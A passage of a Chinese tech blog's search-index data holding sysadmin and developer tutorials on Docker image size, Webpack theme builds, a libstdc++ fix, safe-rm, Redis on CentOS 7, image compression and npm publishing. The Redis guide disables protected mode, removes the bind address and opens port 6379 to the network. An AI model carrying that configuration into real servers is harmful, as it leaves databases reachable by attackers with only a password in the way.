镜像可能会变得很大，让它们的体积变小，这样它们就可以快速拉起，使用很少的资源。Alpine Base 镜像是一个完整的 Linux 发行版，没有太多其他东西。下载通常小于 5mb，但是它需要更多的时间为构建应用程序所需的依赖项编写代码。如果你的容器中需要 Python, Python Alpine 构建是一个不错的折衷方案。它包含 Linux 和 Python，你可以提供大多数其他东西。用最新的 Python Alpine 构建的带有打印脚本 (“hello world”) 的镜像大小为 78.5 MB。Dockerfile 如下： 123FROM python:3.7.2-alpine3.8COPY . /appENTRYPOINT [“python”, “./app/my_script.py”, “my_var”] 多级构建镜像 在 Docker Hub 上，基础镜像的大小为 29MB，当构建子镜像时，需要下载并安装 Python，此时体积就变得很大。除了使用 Alpine 基础镜像，另一种减小镜像大小的方法是使用多级构建。但这种技术还会增加 Dockerfile 的复杂性。多级构建一般使用多个 FROM 指令，可以有选择地将文件 (称为构建工件) 从一个阶段复制到另一个阶段。你可以在最终的镜像中扔掉任何你不想要的东西。这种方法可以减少镜像整体的体积。具体构建流程如下： 每个 FROM 指令 开始构建的新阶段 去掉在之前阶段留下的任何状态 可以用不同的基础镜像 12345678910FROM golang:1.7.3 AS buildWORKDIR /go/src/github.com/alexellis/href-counter/RUN go get -d -v golang.org/x/net/htmlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=build /go/src/github.com/alexellis/href-counter/app .CMD ["./app"] 上面是 DockerFile 中经过修改的多级构建示例，通过给 FROM 指令增加一个名字来命名第一阶段。然后被命名的阶段会通过 COPY –from= 指令引用到 Dockerfile 中。在制造大量容器的情况下，多级构建是有意义的。多级构建可以帮助你从镜像大小中挤出每一寸空间。然而有时多阶段构建会增加复杂性，使镜像更难维护，因此你可能不会在大多数构建中使用它们。 使用 .dockerignore 文件 建议使用 .dockerignore 文件来帮助保持 Docker 镜像的简洁。.dockerignore 类似于.gitignore，它是一个包含 Docker 模式列表的文件，Docker 在生成镜像时需要匹配文件名并排除这些模式。将.dockerignore 文件与 Dockerfile 和构建上下文的其余部分放在同一个文件夹中。运行 docker build 创建镜像时，Docker 会检查 .dockerignore 文件。如果找到则逐行检查文件并使用 Go 的 filepath 匹配规则和 Docker 自己的一些规则来匹配文件名以进行排除。想想 unix 风格的 glob 模式，而不是正则表达式。因此 *.jpg 将排除扩展名为 .jpg 的文件。可以使用以 # 开头的注释来解释在 .dockerignore 中所做的事情。 使用 .dockerignore 文件的好处 帮助你保守秘密。没有人想在镜像中使用密码。 减少镜像大小。更少的文件意味着更小、更快的镜像。 减少构建缓存失效。如果日志或其他文件正在发生变化，而你的镜像缓存因此而失效，则会减慢构建周期。 镜像体积检查 可以使用下面的命令行找到 Docker 镜像和容器的大小 要查看正在运行的容器的大致大小，可以使用 docker container ls -s 命令。 运行 docker image ls 显示镜像的大小。 要查看组成镜像的中间镜像大小，请使用 docker image history my_image:my_tag。 运行 Docker image inspect my_image:tag，该标签将显示跟镜像有关的信息，包括每个层的大小。 安装和使用 dive 工具可以很容易地看到镜像的层内容。 Docker 镜像瘦身总结 尽可能使用正式的基础镜像。官方镜像定期更新，比非官方镜像更安全。 在可能的情况下使用不同的 Alpine 镜像，以保持你的镜像轻量级。 聪明地使用缓存，将可能发生更改的指令放在 Dockerfile 的末尾位置。 使用 .dockerignore 文件将不需要的和不必要的文件从镜像中排除。 使用 dive 工具，可以检查你的 Docker 镜像层，并帮助你削减多余的部分。 尽量不要安装你不需要的软件包，虽然这点很难做到。 在运行指令的末尾包含 &amp;&amp; rm -rf /var/lib/apt/lists/*，以清理 apt 缓存，使其不存储在层中。 如果使用 apt，请在同一指令中将 RUN apt-get update 与 apt-get install 结合使用。然后在该指令中链接多个包。用 \\ 字符在多行上按字母顺序列出包。这种方法减少了要构建的层的数量，并保持简洁，例如： 1234RUN apt-get update &amp;&amp; apt-get install -y \\ package-one \\ package-two \\ &amp;&amp; rm -rf /var/lib/apt/lists/* 本文引用 英文原文链接 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Webpack 构建 Hexo 主题 Yilia 的源码",url:"/posts/4cd11af0.html",text:'相关站点 Yilia Github Yilia 官方构建文档 Yilia 构建常见问题 Yilia 升级 Webpack 版本 构建环境 npm 6.5.0 node 10.15.0 webpack 1.13.2 debian 9 (stretch) 目录结构 layout - 模板目录 languages - 语言配置目录 source-src - 源文件目录，编译到 source 目录 source - Hexo 加载主题资源的主目录，需要编译生成 一般来说，如果想修改页面的 html，可以到 layout 文件夹里直接修改。如果想修改 css、js，则需要到 source-src 文件夹里修改，并通过后面介绍的构建步骤，将源码编译到 source 目录下。 拉取 Yilia 代码 1234567891011121314# 进入Hexo的主题目录# cd /blog-root/themes# 克隆Yilia代码# git clone https://github.com/litten/hexo-theme-yilia.git# 进入Yilia的根目录# cd hexo-theme-yilia# 清理NPM模块的目录# rm -rf node_modules# 安装NPM模块（建议使用VPN）# npm install --unsafe-perm=true --allow-root 执行构建操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# 进入Yilia的根目录# cd hexo-theme-yilia# 清理编译目录（非必要），如果博客已上线一段时间，且考虑到旧用户浏览器的缓存问题，此时必须保留旧的编译文件，否则页面在旧用户的浏览器上可能会显示不正常# rm -rf source/*# 开发可以执行以下命令，此时会用webpack打包，并把文件编译到source目录下，但编译后的文件不会经过压缩处理# 由于webpack打包完成后，不会自动退出，当看到以下日志信息，则代表编译成功，可以使用快捷键 Crtl + C 强制退出# npm run dev&gt; yilia@4.0.0 dev /usr/local/hexo-develop/themes/hexo-theme-yilia&gt; webpackHash: 05a7eebef4ac3b6cddcbVersion: webpack 1.15.0Time: 16582ms Asset Size Chunks Chunk Names img/scrollbar_arrow.png 3.06 kB [emitted] img/default-skin.png 547 bytes [emitted] img/preloader.gif 866 bytes [emitted] fonts/iconfont.b322fa.eot 20 kB [emitted] fonts/iconfont.8c627f.woff 13.2 kB [emitted] fonts/iconfont.16acc2.ttf 19.7 kB [emitted] fonts/iconfont.45d7ee.svg 27.5 kB [emitted]fonts/default-skin.b257fa.svg 1.55 kB [emitted] fonts/tooltip.4004ff.svg 492 bytes [emitted] main.be3dc1.js 179 kB 0 [emitted] main mobile.3bc8c9.js 337 kB 1 [emitted] mobile slider.0bdfac.js 177 kB 2 [emitted] slider main.be3dc1.css 73.7 kB 0 [emitted] main../layout/_partial/script.ejs 115 kB [emitted] ../layout/_partial/css.ejs 80 bytes [emitted] [0] multi mobile 40 bytes {1} [built] + 441 hidden modulesChild html-webpack-plugin for "../layout/_partial/script.ejs": + 3 hidden modulesChild html-webpack-plugin for "../layout/_partial/css.ejs": + 3 hidden modulesChild extract-text-webpack-plugin: + 2 hidden modulesChild extract-text-webpack-plugin: + 5 hidden modulesChild extract-text-webpack-plugin: + 8 hidden modules# 发布最终版本可以执行以下命令，此时编译后会经过压缩处理# npm run dist# 查看编译后的文件列表# tree sourcesource├── fonts│&nbsp;&nbsp; ├── default-skin.b257fa.svg│&nbsp;&nbsp; ├── iconfont.16acc2.ttf│&nbsp;&nbsp; ├── iconfont.45d7ee.svg│&nbsp;&nbsp; ├── iconfont.8c627f.woff│&nbsp;&nbsp; ├── iconfont.b322fa.eot│&nbsp;&nbsp; └── tooltip.4004ff.svg├── img│&nbsp;&nbsp; ├── default-skin.png│&nbsp;&nbsp; ├── preloader.gif│&nbsp;&nbsp; └── scrollbar_arrow.png├── main.45052c.css├── main.45052c.js├── mobile.4c76cb.js└── slider.daf231.js 通过 Hexo 测试构建结果 12345678910111213# 进入博客的根目录# cd /blogroot# 通过Hexo清理Public目录# hexo clean# 通过Hexo构建静态文件# hexo generate# 通过Hexo启动服务# hexo server# 浏览器打开博客页面，查看构建结果是否生效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客 前端"},{title:"Linux 解决 libstdc++ 的版本问题",url:"/posts/5bd5a253.html",text:'错误日志信息 1/usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 查看当前 libstdc++（GLIBCXX）的版本 123456789101112131415161718192021# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19 可以发现当前系统最高只支持 GLIBCXX_3.4.19，并不支持 GLIBCXX_3.4.21，因此当安装需要依赖 GLIBCXX_3.4.21 的软件时，就会出现 /usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found 的错误。 查找 libstdc++.so.6.0.21 库文件 12345# 查找库文件# find / -name libstdc++.so.6.0.21# 如果libstdc++.so.6.0.21库文件已存在，则按照下面的步骤直接创建软链接即可# 如果libstdc++.so.6.0.21库文件不存在，则需要按照下面的步骤编译新版本的GCC，然后再创建软链接 编译新版本的 GCC GCC 各版本的下载地址在这里，其中 gcc-5.2.0 对应 GLIBCXX_3.4.21 与 libstdc++.so.6.0.21，而 gcc-6.5.0 对应 GLIBCXX_3.4.22 与 libstdc++.so.6.0.22，根据自己的需要下载对应版本的 GCC 即可。 12345678910111213141516171819202122232425# 下载文件（117M）# wget http://ftp.tsukuba.wide.ad.jp/software/gcc/releases/gcc-5.2.0/gcc-5.2.0.tar.bz2# 解压文件# tar -xvf gcc-5.2.0.tar.bz2# 进入解压目录# cd gcc-5.2.0# 下载编译gcc所需的依赖文件和库# ./contrib/download_prerequisites# 建立输出目录，用于存放编译时所有产生的中间文件# mkdir build# 进入输出目录# cd build# 执行configure配置# ../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib# 编译gcc，指定编译使用的线程数为8，编译耗时较长，可能需要几个小时# make -j8# 这里为了避免影响系统的稳定性，暂时不执行"make install"命令来替换系统默认版本的gcc 建立软链接 1234567891011121314151617181920212223242526272829303132# 进入输出目录# cd build# 查找编译生成libstdc++.so库文件，下面查找到的libstdc++.so、libstdc++.so.6都只是软链接文件，libstdc++.so.6.0.21才是真正编译生成的库文件# find . -name "libstdc++.so*"./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21# 拷贝libstdc++.so.6.0.21库文件到/usr/lib64/目录下# cp ./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64# 备份系统原有的libstdc++.so.6链接文件# cp /usr/lib64/libstdc++.so.6 /usr/lib64/libstdc++.so.6.bak# 覆盖系统原有的libstdc++.so.6链接文件（这里尽量不要先删除旧的再创建新的libstdc++.so.6链接文件）# ln -s -f /usr/lib64/libstdc++.so.6.0.21 /usr/lib64/libstdc++.so.6# 进入lib64目录# cd /usr/lib64# 查看最终的libstdc++.so库文件列表# ls -al /usr/lib64/libstdc++.so.6*lrwxrwxrwx. 1 root root 19 3月 12 10:08 /usr/lib64/libstdc++.so.6 -&gt; libstdc++.so.6.0.21-rwxr-xr-x. 1 root root 991616 10月 30 14:39 /usr/lib64/libstdc++.so.6.0.19-rwxr-xr-x. 1 root root 11485880 3月 12 10:01 /usr/lib64/libstdc++.so.6.0.21 验证新的 libstdc++.so.6.0.21 库文件是否生效 如果在下面的输出结果中，出现 GLIBCXX_3.4.21，则代表新的 libstdc++.so.6.0.21 库文件生效了。 1234567891011121314151617181920212223# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19GLIBCXX_3.4.20GLIBCXX_3.4.21 参考文章 GLIBCXX3.4.21 not find var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux 安装 safe-rm 工具",url:"/posts/8ac517c2.html",text:'前言 safe-rm 是一款用来替代不安全 rm 的开源软件，可以在 /etc/safe-rm.conf 文件中配置保护名单，定义哪些文件不能被 rm 删除，可用于防止执行 rm -rf 命令导致文件被误删的发生。 安装 safe-rm 工具 123456789101112# 下载文件# wget https://launchpadlibrarian.net/188958703/safe-rm-0.12.tar.gz# 解压文件# tar -xvf safe-rm-0.12.tar.gz# 拷贝可执行文件# cd safe-rm# cp safe-rm /usr/local/bin/# 建立软链接# ln -s /usr/local/bin/safe-rm /usr/local/bin/rm 配置 PATH 环境变量（按需配置） 1234567891011# 确保PATH环境变量中，存在/usr/local/bin路径，且/usr/local/bin路径排在/usr/bin路径前面# 一些脚本中使用完全路径/bin/rm或者/usr/bin/rm则不会受safe-rm影响# echo $PATH.. /usr/local/bin:/usr/local/sbin:/usr/bin ...# 如果PATH环境变量不符合上面说的要求，则手动配置PATH环境变量# vim /etc/profileexport PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:$PATH# 如果修改了PATH环境变量，执行命令使修改生效# source /etc/profile 创建 safe-rm 配置文件，添加保护名单 12345678910111213141516171819202122232425262728293031323334353637# 默认的safe-rm配置文件有以下两个，需要自行创建全局配置：/etc/safe-rm.conf用户配置：~/.safe-rm# 创建全局配置文件# touch /etc/safe-rm.conf# 添加保护名单# vim /etc/safe-rm.conf//bin/boot/dev/etc/home/initrd/lib/lib32/lib64/proc/root/sbin/sys/usr/usr/bin/usr/include/usr/lib/usr/local/usr/local/bin/usr/local/include/usr/local/sbin/usr/local/share/usr/sbin/usr/share/usr/src/var/etc/safe-rm.conf 测试 save-rm 是否生效 1234567891011121314151617# 创建测试文件# touch /home/test.txt# 追加需要保护的文件路径到配置文件中# vim /etc/safe-rm.conf/home/test.txt# 测试删除受保护的文件路径，如果输出skipping日志代表safe-rm生效# rm /home/test.txt# rm -rf /home/test.txtsafe-rm: skipping /home/test.txt# 注意：# 配置文件里面的/etc只能保证执行"rm -rf /etc"命令的时候不能删除，但是如果执行"rm -rf /etc/app"，还是可以删除app文件的# 如果想保证某个目录下面的所有文件都不被删除，则配置文件里可以写成/etc/*，但使用通配符的方式无法避免/etc目录下链接文件被删除# 例如/lib或/lib64这种目录，下面会有很多库文件对应的链接文件，使用safe-rm并不能保护链接文件被删除# 建议将/etc/safe-rm.conf加入到保护名单中，防止/etc/safe-rm.conf被删后配置失效 使用系统默认的删除命令 12# 使用系统默认的删除命令，此时safe-rm的保护作用将失效# /usr/bin/rm -rf /etc/app var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Centos7 生产环境安装 Redis（单机）",url:"/posts/5d728ffd.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Supervisor 12345678910111213# 提示：supervisor主要用于管理redis的开机自启动（带守护进程）# 安装# yum install -y supervisor# 开机自启动# systemctl enable supervisord# 启动服务# systemctl start supervisord# 查看服务状态# systemctl status supervisord 更改系统的最大打开文件描述符数 本站教程 创建 Redis 用户和用户组 12345678# 切换root用户$ sudo -i# 创建redis用户组# groupadd redis# 创建redis用户（不设置用户密码，不允许远程登录）# useradd redis -g redis 下载 Redis 123456789101112# 创建下载目录# mkdir -p /home/redis/software# 下载# cd /home/redis/software# wget http://download.redis.io/releases/redis-5.0.5.tar.gz# 解压# tar -xvf redis-5.0.5.tar.gz# 删除下载文件# rm -f redis-5.0.5.tar.gz 编译安装 Redis 123456789101112131415161718192021# 进入解压目录# cd /home/redis/software/redis-5.0.5# 编译# make# 创建安装目录# mkdir -p /usr/local/redis# 安装# cd /home/redis/software/redis-5.0.5/src# make PREFIX=/usr/local/redis install# 备份配置文件# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf.default# 文件授权# chown -R redis:redis /usr/local/redis# chown redis:redis /etc/redis.conf# chown redis:redis /etc/redis.conf.default Redis 基础配置 123456789101112131415161718# 切换redis用户$ sudo -i su redis# 创建数据目录、日志目录、日志文件$ mkdir /usr/local/redis/data$ mkdir /usr/local/redis/logs$ touch /usr/local/redis/logs/redis.log# 编辑配置文件$ vim /etc/redis.confmaxclients 10000 #最大连接数# bind 127.0.0.1 #注释掉IP绑定protected-mode no #关闭保护模式requirepass yourPassword #设置访问密码dir /usr/local/redis/data/ #指定数据目录logfile "/usr/local/redis/logs/redis.log" #指定日志文件# 注意：当前使用RDB持久化机制，由于Redis默认启用RDB，因此上面无需手动配置，除非需要更改快照存盘的频率 开机自启动 Redis 123456789101112131415161718192021222324252627282930# 切换root用户$ sudo -i# 配置redis前台运行# vim /usr/local/redis/conf/redis.confdaemonize no# 创建redis的supervistor配置文件# touch /etc/supervisord.d/redis.ini# 编辑redis的supervistor配置文件，添加以下配置内容（考虑到服务器安全，必须指定使用redis用户启动redis服务）# vim /etc/supervisord.d/redis.ini[program:redis]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-server /etc/redis.confuser=redisnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)s# 重载supervistor的配置文件，会自动启动redis服务# supervisorctl reload# 查看redis的运行状态# supervisorctl status redisredis RUNNING pid 31513, uptime 0:03:23 #如果输出此日志信息，说明redis启动成功，否则查看redis的启动日志来排查问题# 注意：当redis通过supervistor管理自启动的情况下，不能简单使用“redis-cli shutdown“命令来关闭redis服务，具体的redis服务管理可参考下面的内容。 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=6379/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 Redis 服务 1234567891011# 关闭# supervistorctl stop redis# 启动# supervistorctl start redis# 重启# supervistorctl restart redis# 查看状态# supervistorctl status redis 配置概述 12345配置文件：/etc/redis.conf安装目录：/usr/local/redis/数据目录：/usr/local/redis/data日志文件：/usr/local/redis/logs/redis.logredis的supervistor配置文件：/etc/supervisord.d/redis.ini Redis 启动错误一 12344969:M 23 Nov 2018 12:57:46.920 # You requested maxclients of 10000 requiring at least 10032 max file descriptors.44969:M 23 Nov 2018 12:57:46.920 # Server can\'t set maximum open files to 10032 because of OS error: Operation not permitted.44969:M 23 Nov 2018 12:57:46.920 # Current maximum open files is 4096. maxclients has been reduced to 4064 to compensate for low ulimit. If you need higher maxclients increase \'ulimit -n\'. 一般情况下，如果已经更改了系统的最大打开文件描述符数，不会再出现以上的错误信息，请检查最大打开文件描述符数的更改是否生效。 Redis 启动错误二 123444969:M 23 Nov 2018 12:57:46.921 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.44969:M 23 Nov 2018 12:57:46.921 # Server initialized44969:M 23 Nov 2018 12:57:46.921 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add \'vm.overcommit_memory = 1\'to /etc/sysctl.conf and then reboot or run the command \'sysctl vm.overcommit_memory=1\' for this to take effect. 1234567891011# 编辑配置文件，添加以下内容# vim /etc/sysctl.confvm.overcommit_memory = 1net.core.somaxconn = 1024# 重启系统# reboot# 验证是否生效# sysctl net.core.somaxconn# sysctl vm.overcommit_memory Redis 启动错误三 1244969:M 23 Nov 2018 12:57:46.922 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issuerun the command \'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled\' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled. 1234567891011121314# 执行以下命令# echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled# 编辑配置文件，在文件的末尾添加以下内容# vim /etc/rc.localif test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledfi# 配置文件授权# chmod +x /etc/rc.d/rc.local# 重启系统# reboot var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos 缓存"},{title:"Linux 压缩 JPG-PNG 图片",url:"/posts/db3daf0.html",text:'Jpegoptim 压缩 JPG 图片 12345678# 安装jpegoptim# yum install jpegoptim# 压缩jpg图片# jpegoptim ttlsa.jpg# 批量压缩某目录下所有jpg图片# for i in /data/site/image.ttlsa.com/images/*.jpg; do jpegoptim $i; done Pngcrush 压缩 PNG 图片 12345678910111213141516171819202122232425262728293031# 下载pngcrush# wget https://jaist.dl.sourceforge.net/project/pmt/pngcrush/1.8.13/pngcrush-1.8.13.tar.gz# 解压pngcrush# tar -xvf pngcrush-1.8.13.tar.gz# 编译安装pngcrush# make# cp pngcrush /usr/bin# 压缩png图片，指定图片压缩后的文件名# pngcrush -brute pay_zfb.png pay_zfb_small.png# 压缩png图片，指定图片压缩后直接覆盖原图片（-n参数）# pngcrush -brute -n bg_purple.png# 压缩png图片，指定图片压缩后的文件扩展名（-e参数），例如下面图片压缩后的完整文件名为：bg_purple_small.png# pngcrush -brute -e "_small.png" bg_purple.png# 批量压缩当前目录下所有png图片，指定图片压缩后存放的目录（-d参数），且图片压缩后的文件名不变（-n参数）# pngcrush -brute -d "/data/site/image.ttlsa.com/images" -n *.png# 批量压缩某目录下所有png图片，指定图片压缩后直接覆盖原图片（-n参数）# for i in /data/site/image.ttlsa.com/images/*.png; do pngcrush -brute -n $i; done# 参数说明：# pngcrush --helpusage: pngcrush [options except for -e -d] infile.png outfile.png pngcrush -e ext [other options] file.png ... pngcrush -d dir/ [other options] file.png ... pngcrush -n -v file.png ... var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"NPM 包发布 - Publish",url:"/posts/68618d42.html",text:'第一步：注册 NPM 仓库帐号 NPM 官网 第二步：创建 NodeJS 项目 123456789101112131415161718192021# 创建项目的根目录$ mkdir test-module# 进入项目的根目录$ cd test-module# 初始化当前项目，根据提示填写项目信息$ npm init# 初始化后，最终生成package.json文件，文件内容示例如下：{ "name": "test-module", "version": "1.0.0", "description": "0.0.1", "main": "index.js", "scripts": { "test": "echo \\"Error: no test specified\\" &amp;&amp; exit 1" }, "author": "Clay", "license": "MIT"} 第三步：编写 NodeJS 代码 12345678# 进入项目的根目录$ cd test-module# 创建index.js文件$ touch index.js# 开始编写代码$ vim index.js 第四步：发布项目到 NPM 仓库 12345678910111213141516# 进入项目的根目录$ cd test-module# 登录NPM仓库，填写用户名、密码、邮箱地址$ npm login# 发布项目，如果是首次执行发布命令，需要登录邮箱验证邮箱地址$ npm publish# 取消项目发布$ npm unpublish test-module --forc# 或者取消项目指定版本的发布$ npm unpublish test-module@1.0.0 --forc# 最后登录NPM仓库的管理页面，就可以看到自己刚发布的NPM模块。 更新 NPM 仓库中项目的版本 12345678910111213141516171819# 查看项目在NPM仓库中的所有版本号$ npm view hexo-ssl-auth versions[ \'0.0.1\' ]# 本地修改项目的源码...# 更改本地项目的版本号# 参数 patch 代表补丁，版本号的最后一位自动加1# 参数 minor 代表小修小改，版本号的第二位自动加1# 参数 major 代表大改，版本号的第一位自动加1$ npm version patchv0.0.2# 更改NPM仓库中项目的版本号$ npm publish# 查看项目在NPM仓库中的所有版本号[ \'0.0.1\', \'0.0.2\' ] 错误处理：no_perms Private mode enable, only admin can publish this module 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! no_perms Private mode enable, only admin can publish this module# 错误原因分析使用的是淘宝源cnpm，登陆到的是cnpm# 解决方法切换到npm的官方源，可执行命令：npm config set registry http://registry.npmjs.org/ 错误处理：You do not have permission to publish “npmtest”. Are you logged in as the correct user? 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You do not have permission to publish "npmtest". Are you logged in as the correct user? :# 错误原因分析所要publish的包的name和NPM仓库中已经发布的包的名字重复，因此没有权限发布这个名字的包。简单解释就是包名被别人抢先注册了# 解决方法编辑package.json文件，把name的值换掉。如果还出现上述错误就是还是重名的，继续换！ 错误处理：You cannot publish over the previously published versions: 0.0.3 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You cannot publish over the previously published versions: 0.0.3. : hexo-google-adsense# 错误原因分析所要publish的包的version小于等于NPM仓库中已经发布的包的版本号# 解决方法编辑package.json文件，把version的值更改掉，必须大于NPM仓库中已经发布的包的版本号 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": 